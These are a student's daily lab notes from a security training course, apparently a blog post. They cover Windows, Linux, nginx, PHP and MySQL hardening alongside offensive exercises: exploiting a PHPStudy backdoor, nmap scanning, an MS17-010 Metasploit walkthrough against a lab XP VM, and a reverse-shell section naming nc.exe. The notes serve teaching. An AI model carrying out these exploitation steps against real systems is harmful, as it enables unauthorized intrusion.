<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220718103704954.png" alt="image-20220718103704954"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220718104252732.png" alt="image-20220718104252732"></p>
<h3 id="任务3-熟悉python3读写文件"><a href="#任务3-熟悉python3读写文件" class="headerlink" title="任务3 熟悉python3读写文件"></a>任务3 熟悉python3读写文件</h3><p>参考链接<a target="_blank" rel="noopener" href="https://www.runoob.com/python3/python3-inputoutput.html">https://www.runoob.com/python3/python3-inputoutput.html</a></p>
<p>具体主题：</p>
<p>读和写文件</p>
<h3 id="任务4-，参考"><a href="#任务4-，参考" class="headerlink" title="任务4 ，参考"></a>任务4 ，参考</h3><p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220718141026292.png" alt="image-20220718141026292"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220718140952670.png" alt="image-20220718140952670"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220718141008841.png" alt="image-20220718141008841"></p>
<h3 id="任务5-编写9-9乘法表"><a href="#任务5-编写9-9乘法表" class="headerlink" title="任务5 编写9*9乘法表"></a>任务5 编写9*9乘法表</h3><p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220718140630333.png" alt="image-20220718140630333"></p>
<h3 id="任务6-使用burpsuite在目标PHPStudy环境网站上利用其后门执行系统命令"><a href="#任务6-使用burpsuite在目标PHPStudy环境网站上利用其后门执行系统命令" class="headerlink" title="任务6.使用burpsuite在目标PHPStudy环境网站上利用其后门执行系统命令"></a>任务6.使用burpsuite在目标PHPStudy环境网站上利用其后门执行系统命令</h3><p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220718144341206.png" alt="image-20220718144341206"></p>
<h3 id="任务7-了解httpx的用法"><a href="#任务7-了解httpx的用法" class="headerlink" title="任务7.了解httpx的用法"></a>任务7.了解httpx的用法</h3><p>目标：</p>
<p>能够自定义http请求头</p>
<p>能够了解httpx的其他用法</p>
<p>参考request文档，见群内消息</p>
<h3 id="任务8-利用httpx模块，编写phpstudy后门利用工具，（exploitation）"><a href="#任务8-利用httpx模块，编写phpstudy后门利用工具，（exploitation）" class="headerlink" title="任务8.利用httpx模块，编写phpstudy后门利用工具，（exploitation）"></a>任务8.利用httpx模块，编写phpstudy后门利用工具，（exploitation）</h3><p>目标：要求能够循环接受用户系统命令输入，将返回结果正常解码展示到屏幕上</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220718164920380.png" alt="image-20220718164920380"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220718165813191.png" alt="image-20220718165813191"></p>
<h3 id="任务9-参考上述链接，查看内容包括findall、正则表达式模式"><a href="#任务9-参考上述链接，查看内容包括findall、正则表达式模式" class="headerlink" title="任务9.参考上述链接，查看内容包括findall、正则表达式模式"></a>任务9.参考上述链接，查看内容包括findall、正则表达式模式</h3><p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719090256286.png" alt="image-20220719090256286"></p>
<h2 id="0719第八天"><a href="#0719第八天" class="headerlink" title="0719第八天"></a>0719第八天</h2><h3 id="任务一-windows系统及组件的加固"><a href="#任务一-windows系统及组件的加固" class="headerlink" title="任务一.windows系统及组件的加固"></a>任务一.windows系统及组件的加固</h3><h4 id="1-账户管理和认证授权"><a href="#1-账户管理和认证授权" class="headerlink" title="1.账户管理和认证授权"></a>1.账户管理和认证授权</h4><p>1.1账户</p>
<p>1）默认账户安全：</p>
<p>禁用guest账户</p>
<p>禁用或删除其他无用账户（建议先禁用账户三个月，待确认没有问题后删除。）</p>
<img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719094035516.png" alt="image-20220719094035516" style="zoom:200%;">

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719094112725.png" alt="image-20220719094112725"></p>
<p>2）按照用户分配帐户</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719094706067.png" alt="image-20220719094706067"></p>
<p>3）不显示最后的用户名</p>
<p>按住【win+R】，出现运行命令框；输入gpedit.msc，点击确定即可。</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719095000728.png" alt="image-20220719095000728"></p>
<p>1.2口令</p>
<p>1）密码最长留存期</p>
<p>对于采用静态口令认证技术的设备，帐户口令的留存期不应长于 90 天。 操作步骤打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 帐户策略 &gt; 密码策略 中，配置 密码最长使用期 限 不大于 90 天。</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719095915984.png" alt="image-20220719095915984"></p>
<p>2）帐户锁定策略</p>
<p>1.3授权</p>
<p>远程关机：</p>
<p>打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 用户权限分配 中，配置 从远端系统强制关机 权限只分配给 Administrators 组。</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719100056720.png" alt="image-20220719100056720"></p>
<h4 id="2-日志配置操作"><a href="#2-日志配置操作" class="headerlink" title="2.日志配置操作"></a>2.日志配置操作</h4><p>2.1日志配置</p>
<p>1）审核登录</p>
<p>操作步骤 打开 控制面板 &gt; 管理工具 &gt; 本地安全策略，在 本地策略 &gt; 审核策略 中，设置 审核登录事件。</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719100324920.png" alt="image-20220719100324920"></p>
<p>设置全部更改过后</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719100610607.png" alt="image-20220719100610607"></p>
<p>2）日志文件大小</p>
<h4 id="3-IP协议安全配置"><a href="#3-IP协议安全配置" class="headerlink" title="3.IP协议安全配置"></a>3.IP协议安全配置</h4><p>3.1ip协议安全	</p>
<p>启用 SYN 攻击保护</p>
<h4 id="4-文件权限"><a href="#4-文件权限" class="headerlink" title="4.文件权限"></a>4.文件权限</h4><p>1）关闭默认共享</p>
<p>注意： Windows Server 2012 版本已默认关闭 Windows 硬盘默认共享，且没有该注册表键值。 HKLM\System\CurrentControlSet\Services\LanmanServer\Parameters\AutoShareServer 推荐值： 0</p>
<p>无该组件</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719101344429.png" alt="image-20220719101344429"></p>
<p>2）共享文件夹授权访问</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719101651217.png" alt="image-20220719101651217"></p>
<h4 id="5-服务安全"><a href="#5-服务安全" class="headerlink" title="5.服务安全"></a>5.服务安全</h4><p>5.1 禁用 TCP&#x2F;IP 上的 NetBIOS</p>
<ol>
<li>在 计算机管理 &gt; 服务和应用程序 &gt; 服务 中禁用 TCP&#x2F;IP NetBIOS Helper 服务。</li>
</ol>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719102028860.png" alt="image-20220719102028860"></p>
<p> 2.在网络连接属性中，双击 Internet 协议版本 4（TCP&#x2F;IPv4），单击 高级。在 WINS 页签中，进行 如下设置</p>
<p>禁用不必要的服务</p>
<h4 id="6-安全选项"><a href="#6-安全选项" class="headerlink" title="6.安全选项"></a>6.安全选项</h4><p>6.1启用安全选项</p>
<p>注意</p>
<p>内部系统只能因业务需要而使用，经由管理层授权，管理层将随时监测此系统的使用</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719102633882.png" alt="image-20220719102633882"></p>
<p>6.2禁用未登录前关机</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719102725185.png" alt="image-20220719102725185"></p>
<h4 id="7-其他安全配置"><a href="#7-其他安全配置" class="headerlink" title="7.其他安全配置"></a>7.其他安全配置</h4><p>7.1防病毒管理</p>
<p>7.2设置屏幕保护密码和开启时间</p>
<p>7.3限制远程登录空闲断开时间</p>
<p>7.4操作系统补丁管理</p>
<h3 id="任务二-linux安全加固"><a href="#任务二-linux安全加固" class="headerlink" title="任务二.linux安全加固"></a>任务二.linux安全加固</h3><p><a target="_blank" rel="noopener" href="https://note.youdao.com/s/GomdMUPy">https://note.youdao.com/s/GomdMUPy</a></p>
<h4 id="1-账号和口令"><a href="#1-账号和口令" class="headerlink" title="1.账号和口令"></a>1.账号和口令</h4><p>1.1禁用或删除无用账户</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719110429464.png" alt="image-20220719110429464"></p>
<p>发现有一个无用账户tep</p>
<p>删除该账户</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719110617279.png" alt="image-20220719110617279"></p>
<p>1.2检查特殊账户</p>
<p>1.3添加口令策略</p>
<p>加强口令的复杂度等，降低被猜解的可能性</p>
<p>​     1.使用命令 vi &#x2F;etc&#x2F;login.defs 修改配置文件。</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719110943428.png" alt="image-20220719110943428"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719110759807.png" alt="image-20220719110759807"></p>
<p>​     2.使用 chage 命令修改用户设置。</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719111021232.png" alt="image-20220719111021232"></p>
<p>​      3.设置连续输错三次密码，账号锁定五分钟。使用命令 vi &#x2F;etc&#x2F;pam.d&#x2F;common-auth修改配置文件，在配置文件中添加 auth required pam_tally.so onerr&#x3D;fail deny&#x3D;3 unlock_time&#x3D;300。</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719111244770.png" alt="image-20220719111244770"></p>
<p><strong>2.2 SSH 服务安全</strong></p>
<p>使用命令 vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config 编辑配置文件。</p>
<ul>
<li>不允许 root 账号直接登录系统。</li>
</ul>
<p>设置 PermitRootLogin 的值为 no。</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719113727089.png" alt="image-20220719113727089"></p>
<ul>
<li>修改 SSH 使用的协议版本。</li>
</ul>
<p>设置 Protocol 的版本为 2。</p>
<ul>
<li>修改允许密码错误次数（默认 6 次）。</li>
</ul>
<p>设置 MaxAuthTries 的值为 3。</p>
<p>配置文件修改完成后，重启 sshd 服务生效。</p>
<p>3.2设置登录超时</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719113924261.png" alt="image-20220719113924261"></p>
<p>4.2<strong>记录所有用户的登录和操作日志</strong></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719114029847.png" alt="image-20220719114029847"></p>
<h3 id="任务三-nginx加固"><a href="#任务三-nginx加固" class="headerlink" title="任务三.nginx加固"></a>任务三.nginx加固</h3><p><strong>4.1 日志配置</strong></p>
<p>修改配置，按如下设置日志记录文件、记录内容、记录格式，添加标签为main的log_format格式(http标签内，在所有的server标签内可以调用)：</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719140905104.png" alt="image-20220719140905104"></p>
<p>在server标签内，定义日志路径</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719140930795.png" alt="image-20220719140930795"></p>
<p>可以发现有日志了：</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719141627555.png" alt="image-20220719141627555"></p>
<p>4.2禁止目录浏览</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719141445254.png" alt="image-20220719141445254"></p>
<p>4.3<strong>限制目录执行权限</strong></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719143555073.png" alt="image-20220719143555073"></p>
<p><strong>4.5 最佳经验实践</strong></p>
<p><strong>4.5.1 隐藏版本信息</strong></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719145919216.png" alt="image-20220719145919216"></p>
<p><strong>4.5.2 限制HTTP请求方法</strong></p>
<p>备份nginx.conf配置文件。</p>
<p>　　编辑配置文件，在server中添加如下内容：</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719152231364.png" alt="image-20220719152231364"></p>
<p><strong>4.5.3 限制IP访问</strong></p>
<p>见上图</p>
<p><strong>4.5.4 限制并发和速度</strong></p>
<p><strong>4.5.5 控制超时时间</strong></p>
<p>　　备份nginx.conf配置文件。</p>
<p>　　编辑配置文件，具体设置如下：</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719153525321.png" alt="image-20220719153525321"></p>
<p><strong>4.6.1 Nginx降权</strong></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719152400338.png" alt="image-20220719152400338"></p>
<p><strong>4.6.2 防盗链</strong></p>
<p>编辑配置文件，在server标签内添加如下内容：</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719152444233.png" alt="image-20220719152444233"></p>
<h3 id="任务四-php加固"><a href="#任务四-php加固" class="headerlink" title="任务四.php加固"></a>任务四.php加固</h3><p>对phpstudy中的php 5.4配置进行加固</p>
<p>1.屏蔽PHP错误输出。<br>在&#x2F;etc&#x2F;php.ini(默认配置文件位置)，将如下配置值改为Off</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719162106243.png" alt="image-20220719162106243"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719164022672.png" alt="image-20220719164022672"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719164102117.png" alt="image-20220719164102117"></p>
<p>2.屏蔽PHP版本。<br>默认情况下PHP版本会被显示在返回头里，如：</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719164148626.png" alt="image-20220719164148626"></p>
<p>3.关闭全局变量<br>如果开启全局变量会使一些表单提交的数据被自动注册为全局变量。代码如下：</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719164333819.png" alt="image-20220719164333819"></p>
<p>4.文件系统限制</p>
<p>open_basedir&#x3D;&#x2F;var&#x2F;www;c:&#x2F;phpstudy&#x2F;www</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719164446008.png" alt="image-20220719164446008"></p>
<p>5.禁止远程资源访问</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719164528080.png" alt="image-20220719164528080"></p>
<p>6.禁用危险函数</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719164607417.png" alt="image-20220719164607417"></p>
<h3 id="任务五-配置kali上的mysqld，实现用户的权限限制"><a href="#任务五-配置kali上的mysqld，实现用户的权限限制" class="headerlink" title="任务五.配置kali上的mysqld，实现用户的权限限制"></a>任务五.配置kali上的mysqld，实现用户的权限限制</h3><p>该部分内容需要在linux上操作，该课后作业不单独提交，但需要记录到实训报告中。</p>
<p><strong>目标：</strong>练习mysql的用户权限限制。</p>
<p>要求：</p>
<ol>
<li>通过hostname命令更改本机名称为自己姓名的拼音；</li>
<li>新建一个db_web1数据库，新建一个user_web1用户，让user_web1拥有db_web1的所有权限；</li>
<li>user_web1只能从本地和10.10.10.200上登录；</li>
</ol>
<p>上述内必须要有完成的效果截图。</p>
<p>提交时间：随同实训报告在本周4（7月21日）下午5点前提交</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220720104850894.png" alt="image-20220720104850894"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220720104910641.png" alt="image-20220720104910641"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220719221927627.png" alt="image-20220719221927627"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220720104939402.png" alt="image-20220720104939402"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220720105028134.png" alt="image-20220720105028134"></p>
<h2 id="0720第九天"><a href="#0720第九天" class="headerlink" title="0720第九天"></a>0720第九天</h2><p>今日内容：</p>
<p>端口扫描</p>
<p>服务发现及远程管理</p>
<p>反弹shell</p>
<p>系统攻击实践</p>
<p>了解攻防反制</p>
<p>了解ctf</p>
<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>q1：一个系统上面可以同时开放两个80端口吗</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220720091402119.png" alt="image-20220720091402119"></p>
<p>q2：一个系统上可以开放多少个80端口</p>
<p>可以同时在一个ip上开启两个80地址，一个在tcp上，一个在udp上</p>
<h3 id="任务一"><a href="#任务一" class="headerlink" title="任务一"></a>任务一</h3><ol>
<li><p>熟悉netstat的功能，提示：netstat &#x2F;?</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220720093115811.png" alt="image-20220720093115811"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220720093133127.png" alt="image-20220720093133127"></p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220720094154586.png" alt="image-20220720094154586"></p>
</li>
<li><p>利用python的http.server模块在windows上开启两个80端口，然后用netstat查看</p>
<p>打开两个cmd窗口，均运行python -m http.server  80</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220720103008524.png" alt="image-20220720103008524"></p>
</li>
</ol>
<p>即可开启两个80端口</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220720102942675.png" alt="image-20220720102942675"></p>
<h3 id="任务二使用nmap进行存活主机和服务发现"><a href="#任务二使用nmap进行存活主机和服务发现" class="headerlink" title="任务二使用nmap进行存活主机和服务发现"></a>任务二使用nmap进行存活主机和服务发现</h3><p>使用nmap进行存活主机</p>
<h4 id="Nmap的介绍"><a href="#Nmap的介绍" class="headerlink" title="Nmap的介绍"></a>Nmap的介绍</h4><p>下载地址：<a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org/</a></p>
<p>功能：</p>
<ol>
<li>检测主机是否在线</li>
<li>端口扫描</li>
<li>版本检测</li>
<li>系统检测</li>
<li>还可以探测脚本的编写</li>
</ol>
<p>Zenmap：图形化界面</p>
<h4 id="Nmap更新"><a href="#Nmap更新" class="headerlink" title="Nmap更新"></a>Nmap更新</h4><ol>
<li><p>手动更新</p>
<p>●nmap –script-updatedb</p>
</li>
<li><p>自动更新</p>
</li>
</ol>
<p>​       ●nmap-update.exe SVN更新<a target="_blank" rel="noopener" href="https://nmap.org/mailman/listinfo/svn">https://nmap.org/mailman/listinfo/svn</a> </p>
<h4 id="获取帮助"><a href="#获取帮助" class="headerlink" title="获取帮助"></a>获取帮助</h4><p>nmap -h</p>
<h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn -PE x.x.x.x</span><br></pre></td></tr></table></figure>

<p><code>-sn</code>   不扫描端口，只ping主机</p>
<p><code>-PE</code>   通过ICMP echo判定主机是否存活</p>
<p>这条语句整体达到了一个<code>只通过ICMP echo判断判断目标网段主机是否存活</code></p>
<h4 id="端口扫描-1"><a href="#端口扫描-1" class="headerlink" title="端口扫描"></a>端口扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -PO x.x.x.x</span><br></pre></td></tr></table></figure>

<h5 id="1：使用Nmap进行单目标端口扫描"><a href="#1：使用Nmap进行单目标端口扫描" class="headerlink" title="1：使用Nmap进行单目标端口扫描"></a>1：使用Nmap进行单目标端口扫描</h5><p><code>-sS</code> TCP SYN 扫描 (又称半开放,或隐身扫描) <code>-PO</code> 使用ICMP协议进行ping</p>
<h5 id="2：扫描指定IP-段）主机指定端口（80端口）的开放情况"><a href="#2：扫描指定IP-段）主机指定端口（80端口）的开放情况" class="headerlink" title="2：扫描指定IP(段）主机指定端口（80端口）的开放情况"></a>2：扫描指定IP(段）主机指定端口（80端口）的开放情况</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -PO -p 80 x.x.x.x/24</span><br></pre></td></tr></table></figure>

<h4 id="系统探测"><a href="#系统探测" class="headerlink" title="系统探测"></a>系统探测</h4><p>Nmap使用TCP&#x2F;IP协议栈指纹来识别不同的操作系统和设备。在RFC规范中，有些地方对TCP&#x2F;IP的实现并没有强制规定，由此不同的TCP&#x2F;IP方案中可能都有自己的特定方式。Nmap主要是根据这些细节上的差异来判断操作系统的类型的。 具体实现方式如下： Nmap内部包含了2600多已知系统的指纹特征（在文件nmap-os-db文件中）。将此指纹数据库作为进行指纹对比的样本库。 分别挑选一个open和closed的端口，向其发送经过精心设计的TCP&#x2F;UDP&#x2F;ICMP数据包，根据返回的数据包生成一份系统指纹。 将探测生成的指纹与nmap-os-db中指纹进行对比，查找匹配的系统。如果无法匹配，以概率形式列举出可能的系统。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="literal">-sS</span> <span class="literal">-PO</span> <span class="literal">-sV</span> <span class="literal">-O</span> x.x.x.x</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>-sV</code> 打开系统版本检测</p>
<p><code>-O</code> 尝试识别远程操作系统</p>
</blockquote>
<blockquote>
<p><code>-A</code> 同时打开操作系统指纹和版本检测.</p>
<p><code>-v</code> 详细输出扫描情况.</p>
</blockquote>
<h4 id="服务探测"><a href="#服务探测" class="headerlink" title="服务探测"></a>服务探测</h4><p>探测开放网络应用服务的原理。</p>
<blockquote>
<p>版本侦测主要分为以下几个步骤：</p>
<p>首先检查open与open|filtered状态的端口是否在排除端口列表内。如果在排除列表，将该端口剔除。</p>
<p>如果是TCP端口，尝试建立TCP连接。尝试等待片刻（通常6秒或更多，具体时间可以查询文件nmap-services-probes中 Probe TCP NULL  q||对应的totalwaitms）。通常在等待时间内，会接收到目标机发送的“WelcomeBanner”信息。nmap将接收到的Banner与 nmap-services-probes中NULL probe中的签名进行对比。查找对应应用程序的名字与版本信息。</p>
<p>如果通过“Welcome  Banner”无法确定应用程序版本，那么nmap再尝试发送其他的探测包（即从nmap-services-probes中挑选合适的probe），将 probe得到回复包与数据库中的签名进行对比。如果反复探测都无法得出具体应用，那么打印出应用返回报文，让用户自行进一步判定。 如果是UDP端口，那么直接使用nmap-services-probes中探测包进行探测匹配。根据结果对比分析出UDP应用服务类型。 如果探测到应用程序是SSL，那么调用openSSL进一步的侦查运行在SSL之上的具体的应用类型。</p>
</blockquote>
<p>其实这个步骤的命令与端口探测的命令一致：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -PO x.x.x.x</span><br></pre></td></tr></table></figure>

<p>解释下命令参数：</p>
<blockquote>
<p><code>-sS</code> TCP SYN 扫描 (又称半开放,或隐身扫描)</p>
<p><code>-PO</code> 允许你关闭 ICMP pings.</p>
</blockquote>
<p>整条命令的效果还是对IP<code>172.16.12.2</code>进行一次关闭ICMP PINGS的隐身端口扫描。</p>
<h3 id="任务三-服务发现及远程管理"><a href="#任务三-服务发现及远程管理" class="headerlink" title="任务三.服务发现及远程管理"></a>任务三.服务发现及远程管理</h3><ol>
<li>msf</li>
</ol>
<p>0）关闭litexp防火墙</p>
<p>1)kali中打开msf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220720102121414.png" alt="image-20220720102121414"></p>
<p>2)在nmap发现windows xp的虚拟机后，查找ms17_010的攻击载荷准备攻击</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search 17_010</span><br></pre></td></tr></table></figure>

<p>3)在搜索结果中选择4</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 4</span><br></pre></td></tr></table></figure>

<p>4)设置攻击目标(litexp)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set rhost 192.168.x.x</span><br></pre></td></tr></table></figure>

<p>5)开始攻击</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220720102240881.png" alt="image-20220720102240881"></p>
<p>6）获取meterpreter后，执行shell</p>
<p>如ipconfig，shutdown -s -t 10 -c  “十秒后关机”</p>
<p><img src="/2022/08/16/%E5%AE%9E%E8%AE%AD%E6%AF%8F%E6%97%A5%E8%AE%B0%E5%BD%95/image-20220720102213734.png" alt="image-20220720102213734"></p>
<ol start="2">
<li>cs4的使用</li>
</ol>
<h3 id="任务四-反弹shell"><a href="#任务四-反弹shell" class="headerlink" title="任务四.反弹shell"></a>任务四.反弹shell</h3><p>使用nc.exe</p>
<p>和蚁剑连接虚拟机</p>
<p>kali ip地址：192.168.68.135</p>
